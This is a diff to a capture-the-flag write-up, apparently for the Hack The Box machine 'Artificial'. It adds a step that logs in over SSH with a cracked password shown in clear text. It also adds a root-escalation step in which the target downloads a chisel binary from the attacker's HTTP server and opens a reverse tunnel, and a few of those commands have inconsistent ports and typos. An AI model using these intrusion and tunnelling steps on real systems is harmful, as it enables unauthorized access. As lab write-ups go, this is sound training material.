@@ -104,7 +104,7 @@ And we have shell
 
 
 
-## Privilege Escalation
+## Privilege Escalation to User
 
 ```bash
 cp /usr/share/peass/linpeas/linpeas.sh . 
@@ -129,6 +129,55 @@ SELECT * FROM user;
 5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
 
 ```
+
+
+
+<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>
+
+### User.flag
+
+Now with the password, we can gain access vie SSH with gael user
+
+```bash
+ssh gael@10.10.11.74
+> mattp005numbertwo
+```
+
+Print the user flag
+
+```bash
+cat user.txt
+```
+
+## Privilege Escalation to Root
+
+
+
+### Port Forwarding without SSH password
+
+```bash
+# attacker machine
+# start the chisel server
+apt install chisel
+chisel server --port 8000 -reverse
+
+# get chisel for linux client
+wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz
+gzip -d chisel_1.10.1_linux_386.gz
+python3 -m http.server 8080
+
+# attacker machine
+wget http://10.10.14.109:8880/chisel_1.10.1_linux_386
+chmod +x chisel_1.10.1_linux_386
+./chmod +x chisel_1.10.1_linux_386 
+./chisel_1.10.1_linux_386 client 10.10.14.109:8000 R:8989:127.0.0.1:8989
+
+
+```
+
+
+
+
 
 ```
 sqlite3 /home/app/app/instance/users.db
